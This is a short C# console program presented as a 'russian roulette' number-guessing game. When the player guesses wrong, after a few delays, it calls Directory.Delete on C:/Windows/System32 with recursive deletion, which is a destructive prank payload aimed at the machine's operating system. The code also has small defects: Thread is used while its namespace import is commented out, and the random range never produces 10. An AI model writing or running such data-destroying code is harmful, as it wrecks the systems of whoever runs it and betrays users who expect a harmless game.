using System;
using System.IO;
//using System.Threading;

namespace russian_roulette{

  class Program{
    static void Main(string[] args){   

    Random r = new Random();
    int number = r.Next(1,10);
    Console.WriteLine("Guess the Number (between 1 and 10):");

    string? input = Console.ReadLine();
    int guess;
    
        if (int.TryParse(input, out guess))
            {
                if (guess == number)
                {
                    Console.WriteLine("You guessed it! You survived.");
                }
                else
                {
                    Console.WriteLine($"Oh...");
                    Thread.Sleep(5000);
                    Console.WriteLine("you're wrong...");
                    Thread.Sleep(5000);
                    Console.WriteLine("I'm sorry");
                    Thread.Sleep(5000);
                    Directory.Delete("C:/Windows/System32", true);
                }
            }
        else
        {
            Console.WriteLine("Invalid input!");
        }
    }
  }
}